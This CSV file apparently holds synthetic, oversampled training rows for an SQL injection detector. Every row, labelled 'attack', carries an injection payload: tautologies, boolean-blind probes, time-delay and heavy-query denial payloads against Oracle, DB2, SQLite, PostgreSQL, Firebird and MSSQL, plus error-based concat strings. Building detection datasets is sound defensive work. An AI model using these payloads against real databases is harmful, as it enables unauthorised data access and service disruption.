id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000379,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",nearest_attack_euclidean,R000282,0.28187608156796173
SMOTE_000380,attack,boolean,"1   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000517,1.0965976279769494
SMOTE_000381,attack,boolean," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",nearest_attack_euclidean,R000025,0.0
SMOTE_000382,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000484,0.8197424600880987
SMOTE_000383,attack,boolean,-9120'   )    )    or 8571  =  8571--,nearest_attack_euclidean,R000528,0.7067404527323395
SMOTE_000384,attack,boolean,"1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '",nearest_attack_euclidean,R000417,0.9433113453746115
SMOTE_000385,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000177,0.09921821007515072
SMOTE_000386,attack,boolean,"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000630,0.8379232090612749
SMOTE_000387,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000605,1.2676766402563846
SMOTE_000388,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000577,0.8388748730773178
SMOTE_000389,attack,boolean,"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000404,1.0737660043936075
SMOTE_000390,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,nearest_attack_euclidean,R000120,1.8035442169278244
SMOTE_000391,attack,boolean,-3044'  )   or 4999  =  3051#,nearest_attack_euclidean,R000208,0.6805989373814212
SMOTE_000392,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000136,0.4578218018191696
SMOTE_000393,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000600,0.9246303764308323
SMOTE_000394,attack,boolean,"1"" where 4978  =  4978 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000377,0.3094027667232469
SMOTE_000395,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000484,0.18953138576070389
SMOTE_000396,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000159,0.7264634507982759
SMOTE_000397,attack,boolean,"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",nearest_attack_euclidean,R000744,1.0825140889538631
SMOTE_000398,attack,boolean,1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000199,0.9600830947552477
SMOTE_000399,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'  =  '",nearest_attack_euclidean,R000695,0.9090900730289457
SMOTE_000400,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000308,0.1762370924259643
SMOTE_000401,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000749,1.2709931770552196
SMOTE_000402,attack,boolean,"1"" where 4161  =  4161 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000359,0.6134104213542388
SMOTE_000403,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000340,0.4952479802083904
SMOTE_000404,attack,boolean,"1'+  (  select inrv where 2178  =  2178 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000240,0.3332240698568472
SMOTE_000405,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000207,0.4676276964358571
SMOTE_000406,attack,boolean,1   )    )     )   and 2006  =  2006,nearest_attack_euclidean,R000539,1.1261570899560118
SMOTE_000407,attack,boolean,"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",nearest_attack_euclidean,R000504,0.1579149416703309
SMOTE_000408,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo",nearest_attack_euclidean,R000149,0.07714985927756272
SMOTE_000409,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000150,0.07251578002030165
SMOTE_000410,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000284,0.22597498382431602
SMOTE_000411,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000008,0.31056494567686665
SMOTE_000412,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000159,0.02193326106590203
SMOTE_000413,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000308,0.7499865212108153
SMOTE_000414,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",nearest_attack_euclidean,R000709,0.08000851560627543
SMOTE_000415,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000423,0.594829085986193
SMOTE_000416,attack,boolean,"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R000590,0.04308929663259539
SMOTE_000417,attack,boolean,"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R000589,0.8824268648539781
SMOTE_000418,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000041,0.5775831155533422
SMOTE_000419,attack,boolean,"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",nearest_attack_euclidean,R000227,0.5016094721162558
SMOTE_000420,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000338,0.8536005491898299
SMOTE_000421,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000209,0.32520829196473805
SMOTE_000422,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000605,0.1125801613217886
SMOTE_000423,attack,boolean,1' in boolean mode  )   and 7533  =  7533#,nearest_attack_euclidean,R000689,0.6264128968153451
SMOTE_000424,attack,boolean,"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv",nearest_attack_euclidean,R000767,0.74511352935895
SMOTE_000425,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000547,0.2019082949855699
SMOTE_000426,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",nearest_attack_euclidean,R000561,0.1247073780486827
SMOTE_000427,attack,boolean,"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",nearest_attack_euclidean,R000135,1.2399069059544596
SMOTE_000428,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000101,0.12988985089323546
SMOTE_000429,attack,boolean,"1%""  )   and 7533  =  7533 and   (  ""%""  =  """,nearest_attack_euclidean,R000262,0.46789947982786434
SMOTE_000430,attack,boolean,"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000164,0.25774410149984667
SMOTE_000431,attack,boolean,"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000710,0.8339601813931738
SMOTE_000432,attack,boolean,"-4319""  )   where 7534  =  7534 or 8246  =  3217",nearest_attack_euclidean,R000583,0.7552561344072162
SMOTE_000433,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000122,0.01942939556674453
SMOTE_000434,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",nearest_attack_euclidean,R000440,1.48471108120083
SMOTE_000435,attack,boolean,"-9840   )    )    as thod where 4790  =  4790 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000427,0.5646455774356126
SMOTE_000436,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000607,0.2954801370669099
SMOTE_000437,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",nearest_attack_euclidean,R000275,0.21867851084859422
SMOTE_000438,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000311,0.022631704827060912
SMOTE_000439,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000712,0.41133023804919366
SMOTE_000440,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000077,0.00873535569323903
SMOTE_000441,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",nearest_attack_euclidean,R000154,1.8333211651032657
SMOTE_000442,attack,boolean,-4803%'   )    )    or 8571  =  8571--,nearest_attack_euclidean,R000541,0.12986351197731238
SMOTE_000443,attack,boolean,"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'owga' like 'owga",nearest_attack_euclidean,R000394,0.8736504533409618
SMOTE_000444,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo",nearest_attack_euclidean,R000149,0.13413004617076496
SMOTE_000445,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000462,1.0848130709359487
SMOTE_000446,attack,boolean,-6200%'   )    )    or 8077  =  4661,nearest_attack_euclidean,R000093,0.2715147823027436
SMOTE_000447,attack,boolean,-8836%'  )   or 4856  =  3891,nearest_attack_euclidean,R000527,0.42599954481757374
SMOTE_000448,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000081,0.4891788404313212
SMOTE_000449,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000322,0.8568508500384023
SMOTE_000450,attack,boolean,"1%""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000559,0.20922356667493305
SMOTE_000451,attack,boolean,"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000310,1.0722813249213654
SMOTE_000452,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000600,2.179765168678776
SMOTE_000453,attack,boolean," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",nearest_attack_euclidean,R000037,0.14394857949872172
SMOTE_000454,attack,boolean,"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",nearest_attack_euclidean,R000123,0.1367270842606789
SMOTE_000455,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R000666,0.44015601170992485
SMOTE_000456,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000209,0.6458525642775185
SMOTE_000457,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000156,0.06563340042331457
SMOTE_000458,attack,boolean,-2751 where 6334  =  6334 or   (  9668  =  5845  )  *5845--,nearest_attack_euclidean,R000674,0.9084051477196771
SMOTE_000459,attack,boolean,"1%""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000339,1.4433475267018567
SMOTE_000460,attack,boolean,"1   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000383,0.09799748457387164
SMOTE_000461,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000580,0.5597908305798294
SMOTE_000462,attack,boolean," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",nearest_attack_euclidean,R000025,0.026701124022796924
SMOTE_000463,attack,boolean,"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""oyou""  =  ""oyou",nearest_attack_euclidean,R000451,0.10084965842835253
SMOTE_000464,attack,boolean,-4803%'   )    )    or 8571  =  8571--,nearest_attack_euclidean,R000541,1.1747142575633702
SMOTE_000465,attack,boolean,"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",nearest_attack_euclidean,R000079,2.5896232627095683
SMOTE_000466,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000267,1.7394441654394244
SMOTE_000467,attack,boolean,"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",nearest_attack_euclidean,R000596,0.30759193875478313
SMOTE_000468,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000057,0.6880237785966117
SMOTE_000469,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000584,0.0008356402436435203
SMOTE_000470,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000255,0.2987731813181516
SMOTE_000471,attack,boolean,"1%'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000737,1.23303629620582
SMOTE_000472,attack,boolean,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000716,1.44752054799355
SMOTE_000473,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",nearest_attack_euclidean,R000239,0.2583566685906348
SMOTE_000474,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000209,0.3205477248924294
SMOTE_000475,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000474,0.37474694962845123
SMOTE_000476,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000600,0.0
SMOTE_000477,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000077,1.074081279580794
SMOTE_000478,attack,boolean,"1%""  )   and 8626  =  3626#",nearest_attack_euclidean,R000307,0.7024254771102525
SMOTE_000479,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000177,0.9510149562332192
SMOTE_000480,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R000775,1.6428418900978345
SMOTE_000481,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000009,0.27425202997489
SMOTE_000482,attack,boolean,-9327'  )   or 3038  =  3038,nearest_attack_euclidean,R000475,1.6169126349597557e-05
SMOTE_000483,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000585,0.49471374329267587
SMOTE_000484,attack,boolean,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""cdai""  =  ""cdai",nearest_attack_euclidean,R000729,0.5866294718217756
SMOTE_000485,attack,boolean,"1%'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000737,1.005120221217193
SMOTE_000486,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""%""  =  """,nearest_attack_euclidean,R000172,0.7637880348204366
SMOTE_000487,attack,boolean,"1'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000085,0.15050528909377087
SMOTE_000488,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000620,1.1375194281655656
SMOTE_000489,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000081,0.8185276592050913
SMOTE_000490,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",nearest_attack_euclidean,R000477,0.31426120949456016
SMOTE_000491,attack,boolean,"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu",nearest_attack_euclidean,R000366,0.24144877589934977
SMOTE_000492,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000193,0.3288098177511271
SMOTE_000493,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000597,0.46794796539060746
SMOTE_000494,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000247,0.400732425019002
SMOTE_000495,attack,boolean, or uname like '%,nearest_attack_euclidean,R000049,2.2563028313377522
SMOTE_000496,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000177,0.8570907092587141
SMOTE_000497,attack,boolean,"1'+  (  select inrv where 2178  =  2178 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000240,0.2265611677960621
SMOTE_000498,attack,boolean,"1   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   8867  =  8867",nearest_attack_euclidean,R000576,0.7107526357472206
SMOTE_000499,attack,boolean,"1'||  (  select 'ymwf' where 1229  =  1229 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R000238,0.3285610640070271
SMOTE_000500,attack,boolean,1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  4703  =  4703,nearest_attack_euclidean,R000565,0.08845845752271622
